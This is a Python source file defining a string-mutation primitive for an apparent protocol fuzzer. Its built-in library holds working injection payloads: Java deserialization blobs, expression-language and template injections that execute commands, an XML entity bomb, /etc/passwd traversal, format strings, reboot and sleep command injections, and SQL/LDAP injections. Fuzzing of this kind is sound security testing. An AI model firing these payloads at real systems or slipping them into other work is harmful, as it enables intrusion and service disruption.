import random
import base64

import six
from past.builtins import range

from .base_primitive import BasePrimitive
from .. import helpers
from ..sessions import Dictionary

class String(BasePrimitive):
    # store fuzz_library as a class variable to avoid copying the ~70MB structure across each instantiated primitive.
    _fuzz_library = []
    _CMD= "sleep 10000"
    _specialCharacters = [b' ', b'!', b'"', b'#', b'$', b'%', b'&', b'(', b')', b'*', b'+', b',', b'-', b'.', b'/', b':', b';', b'<',
                         b'=', b'>', b'?', b'@', b'[', b'\\', b']', b'^', b'_', b'`', b'{', b'|', b'}', b'~', b'\'', b't', b'b', b'r',
                         b'n', b'f', b'0', b'1', b'2', b'u', b'o', b'x', b'\r', b'\n',
                         b"\u560a", b"\u560d", b"\u563e", b"\u563c"
                         ]

    _singleLineComments = [
        b"#", b"//", b"-- ", b";", b"%", b"'", b"\"", b"\\", b"!", b"*", b"\r", b"\n", b"\r\n"
    ]

    _multilineComments = [
        b"/*test*/", b"(*test*)", b"%(test)%", b"{test}", b"{-test-}", b"#|test|#", b"#=test=#", b"#[test]#", b"--[[test]]",
        b"<!--test-->"
    ]

    _concatenation = [
        b"", b" ", b"+", b".", b"&", b"||", b"//", b"~", b"<>", b"..", b":", b"^", b"++", b"$+", b","
    ]

    _stringDelimiters = [
        b"", b'"', b"'", b"'''", b"]]", b"`", b"\r", b"\n"
    ]

    _numericInjections = [
        b"+0", b"-0", b"/1", b"*1", b" sum 0", b" difference 0", b" product 1", b" add 0", b" sub 0", b" mul 1", b" div 1",
        b" idiv 1", b"**1", b"^1", b"|0", b" $ne 0", b" $gt 0", b" $lt 0", b" $eq 0"
    ]

    _commandSeparators = [
        b";", b",", b":", b"\n", b"\r", b"\r\n", b"\u0008", b"\u0009", b"\r", b"\n", b"\r\n", b"&&", b"||", b"&", b"|", b"\u001a", b">"
    ]

    def __init__(self, value, size=-1, padding=b"\x00", encoding="ascii", fuzzable=True, max_len=-1, name=None):
        """
        Primitive that cycles through a library of "bad" strings. The class variable 'fuzz_library' contains a list of
        smart fuzz values global across all instances. The 'this_library' variable contains fuzz values specific to
        the instantiated primitive. This allows us to avoid copying the near ~70MB fuzz_library data structure across
        each instantiated primitive.

        @type  value:    str
        @param value:    Default string value
        @type  size:     int
        @param size:     (Optional, def=-1) Static size of this field, leave -1 for dynamic.
        @type  padding:  chr
        @param padding:  (Optional, def="\\x00") Value to use as padding to fill static field size.
        @type  encoding: str
        @param encoding: (Optional, def="ascii") String encoding, ex: utf_16_le for Microsoft Unicode.
        @type  fuzzable: bool
        @param fuzzable: (Optional, def=True) Enable/disable fuzzing of this primitive
        @type  max_len:  int
        @param max_len:  (Optional, def=-1) Maximum string length
        @type  name:     str
        @param name:     (Optional, def=None) Specifying a name gives you direct access to a primitive
        """

        super(String, self).__init__()

        if isinstance(value, bytes):
            self._original_value = value
        else:
            self._original_value = value.encode(encoding=encoding)
        self._value = self._original_value
        self.size = size
        self.max_len = max_len
        if self.size > -1:
            self.max_len = self.size
        self.padding = padding
        self.encoding = encoding
        self._fuzzable = fuzzable
        self._name = name
        self.this_library = [
            self._value * 2,
            self._value * 10,
            self._value * 100,
            # UTF-8
            # TODO: This can't actually convert these to unicode strings...
            self._value * 2 + b"\xfe",
            self._value * 10 + b"\xfe",
            self._value * 100 + b"\xfe",
        ]
        if not String._fuzz_library:
            String._fuzz_library = [
                # java deserialization
                "application/x-java-serialized-object",
                "rO0",
                "rO0ABX1////3",
                "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=",
                "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHB//3dwR//3cHBwcHBwcHBwcA==",
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABBAAAAAc3EAfgAAP0AAAAAAAAx3CAAAABBAAAAAcHB4cHg=",
                "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH//d1cQB+AAB3dXEAfgAAf/93VxAH4AAH//d1cQB+AAB3dXEAfgAAf/93VxAH4AAH//d1cQB+AAB//3",
                "\xAC\xED\x00\x05",
                # expression language
                "Class['classLoader']['resources']['cacheObjectMaxSize']=foo",
                "${T(java.lang.Runtime).getRuntime().exec(\"" + self._CMD + "\")}",
                "${T(java.lang.Runtime).getRuntime().exec(\"" + self._CMD + "\")}",
                "T(java.lang.Runtime).getRuntime().exec(\"" + self._CMD + "\")",
                "T(java.lang.Runtime).getRuntime().exec(\"" + self._CMD + "\")",
                "import java.lang.Runtime;rt = Runtime.getRuntime().exec(\"" + self._CMD + "\")",
                "import java.lang.Runtime;rt = Runtime.getRuntime().exec(\"" + self._CMD + "\")",
                # ognl
                "%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exit(1))}",
                "%{#f = #_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')\n#f.setAccessible(true)\n#f.set(#_memberAccess, true)\n#rt = @java.lang.Runtime@getRuntime()\n#rt.exit(1)\n}",
                # template injections
                "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"" + self._CMD + "\").waitFor()",
                "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"" + self._CMD + "\").waitFor()",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"" + self._CMD + "\") }",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"" + self._CMD + "\") }",
                # some sql
                "'+BENCHMARK(40000000,SHA1(1337))+'",
                # xml processing
                "<!--?xml version=\"1.0\" ?--><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"><!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"><!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"><!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"><!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"><!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\"><tag>&lol9;</tag>",
                # other forms of deserialization
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><boom type=\"yaml\"><![CDATA[--- !ruby/object:UnsafeObject attribute1: value1]]></boom>",
                "<void/>",
                "{'void': null}",
                "<string class ='void'>Hello,world!</string>",
                "!!java.net.URL {}: http://www.google.com",
                "",
                # strings ripped from spike (and some others I added)
                "/.:/" + "A" * 5000 + "\x00\x00",
                "/.../" + "B" * 5000 + "\x00\x00",
                "/.../.../.../.../.../.../.../.../.../.../",
                "/../../../../../../../../../../../../etc/passwd",
                "/../../../../../../../../../../../../boot.ini",
                "..:..:..:..:..:..:..:..:..:..:..:..:..:",
                "\\\\*",
                "\\\\?\\",
                "/\\" * 5000,
                "/." * 5000,
                "!@#$%%^#$%#$@#$%$$@#$%^^**(()",
                "%01%02%03%04%0a%0d%0aADSF",
                "%01%02%03@%04%0a%0d%0aADSF",
                "\x01\x02\x03\x04",
                "/%00/",
                "%00/",
                "%00",
                "%u0000",
                "%\xfe\xf0%\x00\xff",
                "%\xfe\xf0%\x01\xff" * 20,
                # format strings.
                "%n" * 100,
                "%n" * 500,
                b'"%n"' * 500,
                "%s" * 100,
                "%s" * 500,
                b'"%s"' * 500,
                "%x" * 500,
                "%4$2s%3$2s%2$2s%1$2s" * 500,
                "e=%+10.4f" * 500,
                "%1$x",
                "%2$x",
                "%3$x",
                "%4$x",
                "%5$x",
                "%6$x",
                "%7$x",
                "%8$x",
                "%9$x",
                "%10$x",
                # command injection.
                "|touch /tmp/SULLEY",
                ";touch /tmp/SULLEY;",
                "|notepad",
                ";notepad;",
                "\nnotepad\n",
                "|reboot",
                ";reboot;",
                "\nreboot\n",
                # fuzzdb command injection
                "|touch /tmp/INJECTX",
                ";touch /tmp/INJECTX;",
                "|" + self._CMD + "",
                ";" + self._CMD + ";",
                "\n" + self._CMD + "\n",
                "a)|" + self._CMD + ";",
                "CMD=$'" + self._CMD + "';$CMD",
                "a;" + self._CMD + "",
                "a)|" + self._CMD + "",
                "|" + self._CMD + ";",
                "'" + self._CMD + "'",
                "^CMD=$\"" + self._CMD + "\";$CMD",
                "`" + self._CMD + "`",
                "%0DCMD=$'" + self._CMD + "';$CMD",
                "/index.html|" + self._CMD + "|",
                "%0a " + self._CMD + " %0a",
                "|" + self._CMD + "|",
                "||" + self._CMD + ";",
                ";" + self._CMD + "/n",
                "a;" + self._CMD + "|",
                "&" + self._CMD + "&",
                "%0A" + self._CMD + "",
                "a);" + self._CMD + "",
                "$;" + self._CMD + "",
                "&CMD=$\"" + self._CMD + "\";$CMD",
                "&&CMD=$\"" + self._CMD + "\";$CMD",
                ";" + self._CMD + "",
                "id;",
                ";" + self._CMD + ";",
                "&CMD=$'" + self._CMD + "';$CMD",
                "& " + self._CMD + " &",
                "; " + self._CMD + "",
                "&&CMD=$'" + self._CMD + "';$CMD",
                "" + self._CMD + "",
                "^CMD=$'" + self._CMD + "';$CMD",
                ";CMD=$'" + self._CMD + "';$CMD",
                "|" + self._CMD + "",
                "<" + self._CMD + ";",
                "FAIL||" + self._CMD + "",
                "a);" + self._CMD + "|",
                "%0DCMD=$\"" + self._CMD + "\";$CMD",
                "" + self._CMD + "|",
                "%0A" + self._CMD + "%0A",
                "a;" + self._CMD + ";",
                "CMD=$\"" + self._CMD + "\";$CMD",
                "&&" + self._CMD + "",
                "||" + self._CMD + "|",
                "&&" + self._CMD + "&&",
                "^" + self._CMD + "",
                ";|" + self._CMD + "|",
                "|CMD=$'" + self._CMD + "';$CMD",
                "|nid",
                "&" + self._CMD + "",
                "a|" + self._CMD + "",
                "<" + self._CMD + "%0A",
                "FAIL||CMD=$\"" + self._CMD + "\";$CMD",
                "$(" + self._CMD + ")",
                "<" + self._CMD + "%0D",
                ";" + self._CMD + "|",
                "id|",
                "%0D" + self._CMD + "",
                "%0A" + self._CMD + "%0A",
                "%0D" + self._CMD + "%0D",
                ";system('" + self._CMD + "')",
                "|CMD=$\"" + self._CMD + "\";$CMD",
                ";CMD=$\"" + self._CMD + "\";$CMD",
                "<" + self._CMD + "",
                "a);" + self._CMD + ";",
                "& " + self._CMD + "",
                "| " + self._CMD + "",
                "FAIL||CMD=$'" + self._CMD + "';$CMD",
                "<!--#exec self._CMD=\"" + self._CMD + "\"-->",
                "" + self._CMD + ";",
                "LD_PRELOAD=/proc/self/fd/0",
                # some binary strings.
                "\xde\xad\xbe\xef",
                "\xde\xad\xbe\xef" * 10,
                "\xde\xad\xbe\xef" * 100,
                "\xde\xad\xbe\xef" * 1000,
                "\xde\xad\xbe\xef" * 10000,
                # miscellaneous.
                "\r\n" * 100,
                "<>" * 500,  # sendmail crackaddr (http://lsd-pl.net/other/sendmail.txt),
                "¶§¼½¿",
                # special numbers
                "0",
                "-0",
                "1",
                "-1",
                "32767",
                "-32768",
                "65537",
                "-65537",
                "16777217",
                "357913942",
                "-357913942",
                "2147483648",
                "4294967296",
                "536870912",
                "-536870912",
                "99999999999",
                "-99999999999",
                "0x100",
                "0x1000",
                "0x3fffffff",
                "0x7ffffffe",
                "0x7fffffff",
                "0x80000000",
                "0xffff",
                "0xfffffffe",
                "0xfffffff",
                "0xffffffff",
                "0x10000",
                "0x100000",
                "0x99999999",
                b'1.79769313486231E+308',
                b'3.39519326559384E-313',
                b'NaN',
                # special paths
                "\\\\.\\GLOBALROOT\\Device\\HarddiskVolume1\\",
                "\\\\.\\CdRom0\\",
                "\\\\.\\c:",
                "\\\\?\\",
                "\\\\?\\Device\\CdRom0",
                "\\\\?\\Device\\Floppy0",
                "\\\\?\\Device\\Harddisk0\\Partition0",
                "\\\\?\\Device\\Harddisk1\\Partition1",
                "\\\\localhost\\admin$\\",
                "\\\\localhost\\C$\\",
                "\\\\localhost\\C$\\",
                "\\\\?\\UNC\\localhost\\C$\\",
                "\\\\127.0.0.1\\admin$\\",
                "\\\\127.0.0.1\\C$\\",
                "\\\\127.0.0.1\\C$\\",
                "\\\\?\\UNC\\127.0.0.1\\C$\\",

                # xpath injections
                "x' or name()='username' or b'x'='y",
                # ldap injections
                "*(|(mail=*))", "*(|(objectclass=*))",
                "*()|&'",
                "admin*",
                "admin*)((|userpassword=*)",
                "*)(uid=*))(|(uid=*",
                # sql injections
                "'--",
                "' or 1=1--",
                "1 or 1=1--",
                "' or 1 in (@@version)--",
                "1 or 1 in (@@version)--",
                "'; waitfor delay b'0:30:0'--",
                "1; waitfor delay b'0:30:0'--",
            ]

            String._fuzz_library.extend(map(base64.b64decode, Dictionary.get_blons()))
            String._fuzz_library.extend(Dictionary.get_blons())
            String._fuzz_library.extend(Dictionary.get_rfc_keywords())
            String._fuzz_library.extend(Dictionary.get_custom())



            # add some long strings.
            self.add_long_strings("C")
            self.add_long_strings("1")
            self.add_long_strings("<")
            self.add_long_strings(">")
            self.add_long_strings("'")
            self.add_long_strings('"')
            self.add_long_strings("/")
            self.add_long_strings("\\")
            self.add_long_strings("?")
            self.add_long_strings("=")
            self.add_long_strings("a=")
            self.add_long_strings("&")
            self.add_long_strings(".")
            self.add_long_strings(",")
            self.add_long_strings("(")
            self.add_long_strings(")")
            self.add_long_strings("]")
            self.add_long_strings("[")
            self.add_long_strings("%")
            self.add_long_strings("*")
            self.add_long_strings("-")
            self.add_long_strings("+")
            self.add_long_strings("{")
            self.add_long_strings("}")
            self.add_long_strings("\x14")
            self.add_long_strings("\x00")
            self.add_long_strings("\xFE")  # expands to 4 characters under utf16
            self.add_long_strings("\xFF")  # expands to 4 characters under utf16

            # add some long strings with null bytes thrown in the middle of them.
            for length in [128, 256, 1024, 2048, 4096, 32767, 0xFFFF]:
                s = "D" * length
                # Number of null bytes to insert (random)
                for i in range(random.randint(1, 10)):
                    # Location of random byte
                    loc = random.randint(1, len(s))
                    s = s[:loc] + "\x00" + s[loc:]
                String._fuzz_library.append(s)

        self.this_library.extend(self.generate_payloads(self._value, encoding))
        self.this_library = list(dict.fromkeys(self.this_library))
        String._fuzz_library = list(dict.fromkeys(String._fuzz_library))

        # Remove any fuzz items greater than self.max_len
        if self.max_len > 0:
            if any(len(s) > self.max_len for s in self.this_library):
                # Pull out the bad string(s):
                self.this_library = list(set([t[: self.max_len] for t in self.this_library]))
            #if any(len(s) > self.max_len for s in String._fuzz_library):
            #    # Pull out the bad string(s):
            #    String._fuzz_library = list(set([t[: self.max_len] for t in String._fuzz_library]))

    @property
    def name(self):
        return self._name

    def add_long_strings(self, sequence):
        """
        Given a sequence, generate a number of selectively chosen strings lengths of the given sequence and add to the
        string heuristic library.

        @type  sequence: str
        @param sequence: Sequence to repeat for creation of fuzz strings.
        """
        strings = []
        for size in [128, 256, 512, 1024, 2048, 4096, 32768, 0xFFFF]:
            strings.append(sequence * (size - 2))
            strings.append(sequence * (size - 1))
            strings.append(sequence * size)
            strings.append(sequence * (size + 1))
            strings.append(sequence * (size + 2))

        for size in [5000, 10000, 20000, 99999, 100000, 500000, 1000000]:
            strings.append(sequence * size)

        for string in strings:
            self._fuzz_library.append(string)

    def mutate(self):
        """
        Mutate the primitive by stepping through the fuzz library extended with the "this" library, return False on
        completion.

        @rtype:  bool
        @return: True on success, False otherwise.
        """

        # loop through the fuzz library until a suitable match is found.
        while 1:
            # if we've ran out of mutations, raise the completion flag.
            if self._mutant_index == self.num_mutations():
                self._fuzz_complete = True

            # if fuzzing was disabled or complete, and mutate() is called, ensure the original value is restored.
            if not self._fuzzable or self._fuzz_complete:
                self._value = self._original_value
                return False

            # update the current value from the fuzz library.
            self._value = (String._fuzz_library + self.this_library)[self._mutant_index]

            # increment the mutation count.
            self._mutant_index += 1

            # if the size parameter is disabled, done.
            if self.size == -1:
                return True

            # ignore library items greater then user-supplied length.
            # TODO: might want to make this smarter.
            if len(self._value) > self.size or len(self._value) > self.max_len:
                continue
            else:
                return True

    def num_mutations(self):
        """
        Calculate and return the total number of mutations for this individual primitive.

        @rtype:  int
        @return: Number of mutated forms this primitive can take
        """
        return len(String._fuzz_library) + len(self.this_library)

    def _render(self, value):
        """
        Render string value, properly padded.
        """

        if isinstance(value, six.string_types):
            value = helpers.str_to_bytes(value)
        elif isinstance(value, six.text_type):
            value = value.encode(self.encoding)
        else:
            pass
            #raise Exception("Unknown string type: {}".format(type(value)))

        # pad undersized library items.
        if len(value) < self.size:
            value += self.padding * (self.size - len(value))
        return helpers.str_to_bytes(value)

    def generate_payloads(self, value: str, encoding):
        attacks = []
        for special1 in self._specialCharacters:
            for special2 in self._specialCharacters:
                attacks.append(value + special1 + special2)
                attacks.append(value + b"\\" + special1 + b"\\" + special2)
                attacks.append(value + b"\\\\" + special1 + b"\\\\" + special2 )

        for delimiter in self._stringDelimiters:
            for comment in self._singleLineComments:
                attacks.append(value + delimiter + comment)

        for delimiter in self._stringDelimiters:
            for comment in self._multilineComments:
                attacks.append(value + delimiter + comment + delimiter)

        for delimiter in self._stringDelimiters:
            for concatenation in self._concatenation:
                attacks.append(value + delimiter + concatenation + delimiter)

        for numeric in self._commandSeparators:
            attacks.append(value + numeric)

        for command in self._commandSeparators:
            attacks.append(value + command + self._CMD.encode(encoding) )

        return attacks
